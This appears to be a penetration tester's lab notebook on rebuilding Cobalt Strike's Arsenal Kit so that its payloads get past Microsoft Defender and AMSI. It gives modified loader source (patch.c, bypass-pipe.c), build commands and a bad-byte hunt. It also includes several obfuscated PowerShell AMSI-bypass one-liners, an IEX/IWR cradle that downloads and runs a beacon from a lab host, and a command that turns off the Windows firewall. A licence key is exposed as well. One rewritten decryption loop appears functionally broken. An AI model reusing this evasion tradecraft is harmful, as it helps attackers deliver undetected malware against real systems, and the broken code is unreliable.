#### Generic
- `blaster` password is `blaster`
- set to `host` only so it doesn't reach out to the internet - keep it like that but if we do connect to the internet then make sure to `disable/enable` `telemetry`

- disable all these before connecting to the internet, `specifically` the `Automatic sample submission` is  = `telemetry` and needs to be turned off
![[Pasted image 20250123130734.png]]
#### Notes:


- created `fresh` screenshot and `after` telemetry is disabled screenshot for `Guardian`
- switching networking from `host only` to `NAT` 
- downloaded `gocheck` into `/home/kali/tools/gocheck`

- working directory with `December 2024 Cobaltstrike & Arsenal-Kit`
```bash
┌──(root💀gobots)-[23Jan2025 18:44:44]-[/opt/cobaltstrike_testing]
└─# ls
arsenal-kit  cobaltstrike  custom-cobalt
```
- license key 
```bash
abdf-0349-c00b-0009 <----bugs + TT (Tyler Teamlead)
```
updating to ``
```bash
┌──(root💀gobots)-[23Jan2025 18:50:08]-[/opt/cobaltstrike_testing/cobaltstrike]                                                        
└─# ./update                                                                                                                                                                                              
[!] Running update with type: linux                                                                                                    
[+] Cobalt Strike Update (20241209)                                                                                                    
[+] ****************************************************************************                                                       
[+] Cobalt Strike requires Java 11 or later to be installed.
[+] Ensure that Java 11 or later is installed before running the updater.
[+] ****************************************************************************
[+] ----------------------------------------------------------------------------
[+] The Cobalt Strike Installation Guide contains the full list of requirements.
[+] ----------------------------------------------------------------------------
[*] Overriding install type To: linux
[*] Please enter your license key:
abdf-0349-c00b-0009
[*] Checking for latest version
[*] Downloading the latest version of Cobalt Strike
Downloaded 4.5mb
Downloaded 9.5mb
Downloaded 15.0mb
Downloaded 20.0mb
Downloaded 25.5mb
Downloaded 31.0mb
Downloaded 39.0mb
Downloaded 45.0mb
Downloaded 49.0mb
Downloaded 54.5mb
Downloaded 58.0mb
Read 60.9mb
[+] Download complete. Unpacking Cobalt Strike program data.
[+] Unpacked Cobalt Strike program data. Now verifying the download
[*] Download latest hashes
[+] Verified Cobalt Strike 4.10.1 Licensed (cobaltstrike.jar)
    SHA-256: f0fc02bec05462a1df647efa8e95cbbadf5fcabf464bde7675919b6781d740fd
[*] Updating cobaltstrike.jar
[+] SUCCESS! Updated cobaltstrike.jar
[*] Download releasenotes.txt
[+] Downloaded and updated releasenotes.txt. Be sure to read this file!
[*] Extracting TeamServerImage
[+] SUCCESS! Extracted TeamServerImage
[*] Refresh server cobaltstrike.auth.server
[+] Refreshed your Cobalt Strike server authorization file!
[*] Extracting cobaltstrike-client.jar
[+] SUCCESS! Extracted cobaltstrike-client.jar
[*] Refresh client cobaltstrike.auth.client
[+] Refreshed your Cobalt Strike client authorization file!
[+] Done!
```
- reviewing `releasenotes.txt`
![[Pasted image 20250123135626.png]]
- running `./c2lint` to make sure `custom.profile` still works
```bash
┌──(root💀gobots)-[23Jan2025 18:56:49]-[/opt/cobaltstrike_testing/cobaltstrike/server]                                          
└─# ./c2lint /opt/cobaltstrike/custom-cobalt/Profiles/custom.profile                                                                  
[*] Starting c2lint                                                                                                                    
```
- running  `./c2lint` to make sure this one works
```bash
┌──(root💀gobots)-[23Jan2025 19:06:06]-[/opt/cobaltstrike_testing/cobaltstrike/server]                                                
└─# ./c2lint /opt/internal/PwnLibrary/custom-cobalt/Profiles/custom.profile   
```
#### Arsenal_kit.config modification
modifying `/opt/cobaltstrike_testing/arsenal-kit/arsenal_kit.config` to change to `true` for `resource_kit` and `mimikatz_kit` like in grows example
![[Pasted image 20250122113526.png]]
properly modified
![[Pasted image 20250128151710.png]]
modified from `artifactkit_allocator="HeapAlloc"`
![[Pasted image 20250128154846.png]]
to `artifactkit_allocatior="VirtualAlloc"`
![[Pasted image 20250128154952.png]]
modified from `artifactkit_syscalls_method="none"`
![[Pasted image 20250128155203.png]]

#### bypass-pipe.c modification
modifying line `130`
```bash
sprintf(pipename, "%c%c%c%c%c%c%c%c%cnetsvc\\%d", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));
```
![[Pasted image 20250128154324.png]]with
```bash
sprintf(pipename, "%c%c%c%c%c%c%c%c%cnotrt-svc\\noptev", 92, 92, 46, 92, 112, 105, 112, 101, 92);
```
properly modified
![[Pasted image 20250128154542.png]]

#### template.x64.ps1
keeping `/opt/cobaltstrike_testing/custom-cobalt/Files/template.x64.ps1` the same as it is in github


#### patch.c
before `patch.c` fix with grows notes - used to build payloads that bypass defender - lines 35 - 53

![[Pasted image 20250128175808.png]]
replacing with this code from `grows` notes 
```bash
void spawn(void * buffer, int length, char * key) { char process[64] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"; int z; /* decode the process name with the key (valid name, \0, junk to fill 64) */ for (int z = 0; z < sizeof(process); z++) { char* a = (char *)process + z; char* b = (char *)process + z; GetTickCount(); *a = *b ^ key[z % 8]; } /* decode the payload with the key */ for (z = 0; z < length; z++) { char* a = (char *)buffer + z; char* b = (char *)buffer + z; GetTickCount(); *a = *b ^ key[z % 8]; } /* propagate our key function pointers to our payload */ set_key_pointers(buffer); inject(buffer, length, process); }
```
after spacing is not right but it probably doesn;t matter
![[Pasted image 20250128180709.png]]

line 116 change
```bash
for (int i = 0; i < length; i++) { char* a = (char *)ptr + i; char* b = (char *)buffer + i; GetTickCount(); *a = *b ^ key[i % 8]; }
```

![[Pasted image 20250128180904.png]]

once all changes are made going to build the artifacts and place them in guardian `malware` folder - need to mount

```bash
./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobalt
```
nah `nvm` just going to place in `/opt/cobaltstrike_testing/arsenal-kit/kits/artifact/malware_artifacts`
got error too small
```bash
┌──(root💀gobots)-[28Jan2025 23:18:25]-[/opt/cobaltstrike_testing/arsenal-kit/kits/artifact]
└─# ./build.sh pipe VirtualAlloc 310272 5 false false none /opt/cobaltstrike_testing/arsenal-kit/kits/artifact/malware_artifacts
[Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts
[Artifact kit] [*] Using allocator: VirtualAlloc
[Artifact kit] [-] The STAGE size needs to be 344564 or larger when using a RDLL size of 5K

```
new command
```bash
┌──(root💀gobots)-[28Jan2025 23:18:27]-[/opt/cobaltstrike_testing/arsenal-kit/kits/artifact]
└─# ./build.sh pipe VirtualAlloc 344564 5 false false none /opt/cobaltstrike_testing/arsenal-kit/kits/artifact/malware_artifacts
[Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts
[Artifact kit] [*] Using allocator: VirtualAlloc
[Artifact kit] [*] Using STAGE size: 344564
[Artifact kit] [*] Using RDLL size: 5K
[Artifact kit] [*] Using system call method: none
[Artifact kit] [+] Artifact Kit: Building artifacts for technique: pipe
[Artifact kit] [*] Recompile artifact32.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [+] The artifacts for the bypass technique 'pipe' are saved in '/opt/cobaltstrike_testing/arsenal-kit/kits/artifact/malware_artifacts/pipe'

```
chasing the bad bytes now to make sure it bypasses defender with go check

```powershell
c:\Users\blaster\Desktop\Tools\gocheck-main>
gocheck.exe ..\..\malware\artifact64.exe                                                                                                                               
```
bad byes at `0x8D7`
![[Pasted image 20250128184255.png]]
importing `artifact64.exe` to ghidra to chase `bytes`
![[Pasted image 20250128184559.png]]
analyzing
![[Pasted image 20250128184656.png]]
chasing these bad bytes
```bash
[!] Isolated bad bytes at offset 0x8D7 in the original file [approximately 2263 / 41984 bytes]                          
00000000  89 c3 39 f7 7e 1c ff 15  b5 bd 00 00 48 89 f0 83  |..9.~.......H...|                                          
00000010  e0 07 41 8a 04 04 32 44  35 00 88 04 33 48 ff c6  |..A...2D5...3H..|   
```
bad byes for `89 c3 39 f7 7e 1c ff 15`
![[Pasted image 20250128185042.png]]checking the 2nd line `e0 07 41 8a 04 04 32 44`
same location 
![[Pasted image 20250128185139.png]]
after reviewing `patch.c` and identifying the function `CreateThread`  to `CTRL-F` in `VSCODE` we can identify what needs to change
![[Pasted image 20250128190358.png]]
line 116
![[Pasted image 20250128190453.png]]
`chatgpt` defender bypass for line 116

```bash
#include <windows.h>
#include <stdlib.h>
#include <time.h>

void WarChiefAssassination(char* ptr, char* buffer, int length) {
    int i;
    char dynamicKey[8];

    // Generate a dynamic key based on current time and a random number
    srand((unsigned int)time(NULL)); // Seed with time
    for (i = 0; i < 8; i++) {
        dynamicKey[i] = (char)(rand() % 256); // Fill with random values
    }

    // Introduce a delay or indirection to avoid obvious patterns
    DWORD startTick = GetTickCount();
    DWORD diffTick = 0;
    for (i = 0; i < length; i++) {
        // Example of dynamic key usage and indirect delay
        // Calculate how much time has passed since the last tick
        diffTick = GetTickCount() - startTick;
        
        // Using a more complex key derivation to avoid static key patterns
        char currentKey = dynamicKey[i % 8] ^ (char)(diffTick % 256);
        
        // XOR decryption with the dynamic key
        *(ptr + i) = *(buffer + i) ^ currentKey;

        // Indirectly manipulate timing or calculation to throw off detection
        startTick = GetTickCount(); // Update startTick for next iteration
    }
}

```
full code

```bash
/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2012-2024 Fortra, LLC and its group of companies. All trademarks and registered trademarks are the property of their respective owners.
 *
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"
#if USE_SYSCALLS == 1
#include "syscalls.h"
#include "utils.h"
#endif

char data[sizeof(phear)] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

void set_key_pointers(void * buffer) {
    phear * payload = (phear *)data;

    /* this payload does not adhere to our protocol to pass GetModuleHandleA / GetProcAddress to
       the payload directly. */
    if (payload->gmh_offset <= 0 || payload->gpa_offset <= 0)
        return;

    void * gpa_addr = (void *)GetProcAddress;
    void * gmh_addr = (void *)GetModuleHandleA;

    memcpy(buffer + payload->gmh_offset, &gmh_addr, sizeof(void *));
    memcpy(buffer + payload->gpa_offset, &gpa_addr, sizeof(void *));
}

#ifdef _MIGRATE_
#include "start_thread.c"
#include "injector.c"

void spawn(void * buffer, int length, char * key) {
    char process[64] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM";
    int z;

    /* decode the process name with the key (valid name, \0, junk to fill 64) */
    for (int z = 0; z < sizeof(process); z++) {
        char* a = (char *)process + z;
        char* b = (char *)process + z;
        GetTickCount();
        *a = *b ^ key[z % 8]; // Original decryption logic
    }

    /* decode the payload with the key */
    for (z = 0; z < length; z++) {
        char* a = (char *)buffer + z;
        char* b = (char *)buffer + z;
        GetTickCount();
        *a = *b ^ key[z % 8]; // Original decryption logic
    }

    /* propagate our key function pointers to our payload */
    set_key_pointers(buffer);
    inject(buffer, length, process);
}
#else

#if STACK_SPOOF == 1
#include "spoof.c"
#endif

void run(void * buffer) {
    void (*function)();
    function = (void (*)())buffer;
#if STACK_SPOOF == 1
    beacon_threadid = GetCurrentThreadId();
#endif
    function();
}

void spawn(void * buffer, int length, char * key) {
    void * ptr = NULL;

    /* This memory allocation will be released by beacon for these conditions:
     *    1. The stage.cleanup is set to true
     *    2. The reflective loader passes the address of the loader into DllMain.
     *
     * This is true for the built-in Cobalt Strike reflective loader and the example
     * user defined reflective loader (UDRL) in the Arsenal Kit.
     */
#if USE_HeapAlloc
    /* Create Heap */
    HANDLE heap;
    heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);

    /* allocate the memory for our decoded payload */
    ptr = HeapAlloc(heap, 0, 10);

    /* Get wacky and add a bit of of HeapReAlloc */
    if (length > 0) {
        ptr = HeapReAlloc(heap, 0, ptr, length);
    }

#elif USE_VirtualAlloc
#if USE_SYSCALLS == 1
    SIZE_T size = length;
    NtAllocateVirtualMemory(GetCurrentProcess(), &ptr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#else
    ptr = VirtualAlloc(0, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#endif

#elif USE_MapViewOfFile
#if USE_SYSCALLS == 1
    SIZE_T size = length;
    HANDLE hFile = create_file_mapping(0, length);
    ptr = map_view_of_file(hFile);
    NtClose(hFile);
#else
    HANDLE hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, length, NULL);
    ptr = MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);
    CloseHandle(hFile);
#endif
#endif

    // Modified decryption logic
    for (int i = 0; i < length; i++) {
        char* a = (char *)ptr + i;
        char* b = (char *)buffer + i;

        // Dynamic key generation using current time and random values
        srand((unsigned int)GetTickCount()); // Seed with current time
        char dynamicKey = (char)(rand() % 256); // Generate a random key per byte
        
        // Introduce time-based obfuscation
        DWORD tickDiff = GetTickCount() % 256;
        *a = *b ^ (dynamicKey ^ tickDiff); // XOR with dynamic key and time-based modification
    }

#if STACK_SPOOF == 1
    /* setup stack spoofing */
    set_stack_spoof_code();
#endif

    /* propagate our key function pointers to our payload */
    set_key_pointers(ptr);

#if defined(USE_VirtualAlloc) || defined(USE_MapViewOfFile)
    /* fix memory protection */
    DWORD old;
#if USE_SYSCALLS == 1
    NtProtectVirtualMemory(GetCurrentProcess(), &ptr, &size, PAGE_EXECUTE_READ, &old);
#else
    VirtualProtect(ptr, length, PAGE_EXECUTE_READ, &old);
#endif
#endif

    /* spawn a thread with our data */
#if USE_SYSCALLS == 1
    HANDLE thandle;
    NtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), &run, ptr, 0, 0, 0, 0, NULL);
#else
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&run, ptr, 0, NULL);
#endif
}
#endif

```
only this is the modified decryption to replace line 116
```bash

// Modified decryption logic
 for (int i = 0; i < length; i++) {
     char* a = (char *)ptr + i;
     char* b = (char *)buffer + i;

     // Dynamic key generation using current time and random values
     srand((unsigned int)GetTickCount()); // Seed with current time
     char dynamicKey = (char)(rand() % 256); // Generate a random key per byte
        
     // Introduce time-based obfuscation
     DWORD tickDiff = GetTickCount() % 256;
     *a = *b ^ (dynamicKey ^ tickDiff); // XOR with dynamic key and time-based modification
   }
```
what it looks like in `patch.c`
![[Pasted image 20250128192927.png]]
saving and going to regenerate the payload - might need to make mods to `bypass-pipe.c`

nvm `patch.c` was the file that worked - no artifact detected success
![[Pasted image 20250128194505.png]]
now to catch a beacon to see if succsessful
reference from `CRTO` [[1. initial_Beacon]]

`c2lint` to make sure profile is good
```bash
./c2lint /opt/cobaltstrike_testing/custom-cobalt/Profiles/custom.profile
```

![[Pasted image 20250128195238.png]]
`cobaltstrike server` setup
```bash
──(root💀gobots)-[29Jan2025 00:49:35]-[/opt/cobaltstrike_testing/cobaltstrike/server]
./teamserver 192.168.146.137 passphrase /opt/cobaltstrike_testing/custom-cobalt/Profiles/custom.profile
```
`client` setup
```bash
┌──(root💀gobots)-[29Jan2025 00:54:21]-[/opt/cobaltstrike_testing/cobaltstrike/client]                                                                                
└─# ./cobaltstrike                                                                                                                                                                  
[*] Starting cobaltstrike client                                                                                                                             
[*] Loading original saved frame location/size: x=0 y=0 width=0 height=0                                                                                               
[*] Loading Windows error codes.                                                                                                                                       
[*] Windows error codes loaded                                                                                                                                         
Gtk-Message: 00:56:37.837: Failed to load module "canberra-gtk-module"                                                                                                 
[-] Opened: Scripts with no remove listener   

```
cobaltstrike up
![[Pasted image 20250128195815.png]]
when attempting to generate payload got this error
![[Pasted image 20250128200112.png]]

building the `new` artifact kit in `grows old format` with a new size
```bash
./build.sh artifact VirtualAlloc 344564 5 false false none /opt/cobaltstrike_testing/arsenal-kit/dist/

### correct size
./build.sh pipe VirtualAlloc 344564 5 false false none /opt/cobaltstrike_testing/arsenal-kit/kits/artifact/malware_artifacts
```

recompiling with `pipe` method 
```bash
┌──(root💀gobots)-[29Jan2025 01:25:01]-[/opt/cobaltstrike/arsenal-kit/kits/artifact]
└─# ./build.sh pipe VirtualAlloc 344564 5 false false none /opt/cobaltstrike_testing/arsenal-kit/dist/artifact/
[Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts
[Artifact kit] [*] Using allocator: VirtualAlloc
[Artifact kit] [*] Using STAGE size: 344564
[Artifact kit] [*] Using RDLL size: 5K
[Artifact kit] [*] Using system call method: none
[Artifact kit] [+] Artifact Kit: Building artifacts for technique: pipe
[Artifact kit] [*] Recompile artifact32.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [+] The artifacts for the bypass technique 'pipe' are saved in '/opt/cobaltstrike_testing/arsenal-kit/dist/artifact//pipe'
```
rebuilt new `artifacts` and placed them in `/opt/cobaltstrike_testing/arsenal-kit/dist`, also copied the `arsenal.cna` to load the scripts and `grows` `mimikats` and `resource` payloads
![[Pasted image 20250128203139.png]]
going to unload the `old` `arsenal_kit.cna` and `load` the new one
![[Pasted image 20250128203242.png]]
new one is loaded
![[Pasted image 20250128203350.png]]
still getting this error
![[Pasted image 20250128203442.png]]
testing new size for rebuilt
```bash
./build.sh pipe VirtualAlloc 310272 5 false false none /opt/cobaltstrike_testing/arsenal-kit/dist/artifact/
```
able to rebuild without any issues with old `build.sh` script
```bash
┌──(root💀gobots)-[29Jan2025 01:52:53]-[/opt/cobaltstrike/arsenal-kit/kits/artifact]
└─# ./build.sh pipe VirtualAlloc 310272 5 false false none /opt/cobaltstrike_testing/arsenal-kit/dist/artifact/
[Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts
[Artifact kit] [*] Using allocator: VirtualAlloc
[Artifact kit] [*] Using STAGE size: 310272
[Artifact kit] [*] Using RDLL size: 5K
[Artifact kit] [*] Using system call method: none
[Artifact kit] [+] Artifact Kit: Building artifacts for technique: pipe
[Artifact kit] [*] Recompile artifact32.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [+] The artifacts for the bypass technique 'pipe' are saved in '/opt/cobaltstrike_testing/arsenal-kit/dist/artifact//pipe'
```
not bypassing
![[Pasted image 20250128205633.png]]
```bash
[!] Isolated bad bytes at offset 0x8CD in the original file [approximately 2253 / 41984 bytes]                          
00000000  15 0e be 00 00 48 89 c3  31 c0 39 c6 7e 15 48 89  |.....H..1.9.~.H.|                                          
00000010  c2 83 e2 07 8a 54 15 00  32 14 07 88 14 03 48 ff  |.....T..2.....H.|   
```
i think that it may not be bypassing because the old `.build.sh` is differnt - it was

modified `build.sh` in new build `5k` size back to `310272`
![[Pasted image 20250128220835.png]]
rebuilt using the new `build.sh`

```bash
┌──(root💀gobots)-[29Jan2025 03:04:13]-[/opt/cobaltstrike_testing/arsenal-kit/kits/artifact]
└─# ./build.sh pipe VirtualAlloc 310272 5 false false none /opt/cobaltstrike_testing/arsenal-kit/dist/artifact/

[Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts
[Artifact kit] [*] Using allocator: VirtualAlloc
[Artifact kit] [*] Using STAGE size: 310272
[Artifact kit] [*] Using RDLL size: 5K
[Artifact kit] [*] Using system call method: none
[Artifact kit] [+] Artifact Kit: Building artifacts for technique: pipe
[Artifact kit] [*] Recompile artifact32.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [+] The artifacts for the bypass technique 'pipe' are saved in '/opt/cobaltstrike_testing/arsenal-kit/dist/artifact//pipe'

```
bypassed defender
![[Pasted image 20250128221022.png]]
deleting the old artifacts and moving `pipe` into the `/artifact` directory

![[Pasted image 20250128221208.png]]
done
![[Pasted image 20250128221302.png]]
reloaded `artifact.cna`
![[Pasted image 20250128221350.png]]

#### Grow assistance
- the way to setup the entirety of `arsenal kit` is by evalutating the `arsenal_kit.config` to enable the kits we want - in this case its `mimikats, resource, and artifact kit`
- once everything is set, good to build
 ![[Pasted image 20250129183820.png]]
this places everything in the `/dist` directory - just make sure to load the new `arsenal_kit.cna` in cobalt and restart the server 
![[Pasted image 20250129184228.png]]
when testing `resource kit` the payload `IEX (IWR http://192.168.179.129/hello -useb)` gets flagged because the `AMSI` is bad
![[Pasted image 20250129184553.png]]
to modify the `amsi` being utilized we must modify `/opt/cobaltstrike_testing/arsenal-kit/kits/resource/compress.ps1`
![[Pasted image 20250129184747.png]]
original `compress.ps1`
```bash
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();  
```
add new `amsi` to compress.ps1 - semi colon at the end
```bash
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
$o = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent
$t = [TrollAMSI].GetMethods() | Where-Object Name -eq 'M'
[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value + [long]8)),0, [long]$o.MethodHandle.Value + [long]8,1)
```
resource kit working with `RTP` on with new amsi
![[Pasted image 20250129155657.png]]
- make more variable changes to `template.x64.ps1` to enable the `powershell runners`




- figure out why the artifact kit isnt reaching out


adding the new `compress.ps1` made sure the `;` is there
![[Pasted image 20250129184956.png]]
restarting the `cobaltstrike server` and testing `resource kit` to make sure it works again
- didnt work
![[Pasted image 20250129185450.png]]
think i need to rebuild the entire kit for it to take
![[Pasted image 20250129185630.png]]
reload `arsenal_kit.cna`
![[Pasted image 20250129185735.png]]
nothing happened, i think the `compress.ps1` has to be on one line
- one liner compress.ps1
```bash
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}};$o=[Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic')|Where-Object Name -eq ScanContent;$t=[TrollAMSI].GetMethods()|Where-Object Name -eq 'M';[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value+[long]8)),0,[long]$o.MethodHandle.Value+[long]8,1);
```
rebuild the arsenal kit


- had to turn off windows firewall because it was blocking my linux machine
```bash
netsh advfirewall set allprofiles state off
```

reverted back to the original `compress.ps1` looks like the formatting of my current one just isnt working in compress.ps1 because the original was caught 
![[Pasted image 20250129193547.png]]
but i can see it atleast working to grab it
![[Pasted image 20250129193627.png]]
the `oneliner` works - not sure why its not working in `compress.ps1`

![[Pasted image 20250129193811.png]]
works fine this way - just need to find a way to get compress.ps1 to take it
![[Pasted image 20250129194053.png]]
trying again
![[Pasted image 20250129194229.png]]
rebuilding `arsenal_kit`
```bash
┌──(root💀gobots)-[30Jan2025 00:43:50]-[/opt/cobaltstrike_testing/arsenal-kit]
└─# ./build_arsenal_kit.sh       
```
test payload
```bash
IEX(IWR http://192.168.179.129:80/hahaha -useb)
```
for some reason its getting the file, not getting caught by `amsi` but not executing the beacon - sent at 7:53
![[Pasted image 20250129195452.png]]
can see here its getting it just not executing it
![[Pasted image 20250129195548.png]]
im able to get the file but its not executing it, not sure whats going on - im gonna try to find a new amsi bypass

![[Pasted image 20250129200149.png]]

raw powershell one liner in [https://github.com/cybersectroll/TrollAMSI](https://github.com/cybersectroll/TrollAMSI "https://github.com/cybersectroll/TrollAMSI
(https://github.com/cybersectroll/TrollAMSI)")

```bash
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1)
```
original i tried that didnt work
```bash
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}};$o=[Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic')|Where-Object Name -eq ScanContent;$t=[TrollAMSI].GetMethods()|Where-Object Name -eq 'M';[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value+[long]8)),0,[long]$o.MethodHandle.Value+[long]8,1);
```

going to try the raw one first

```bash
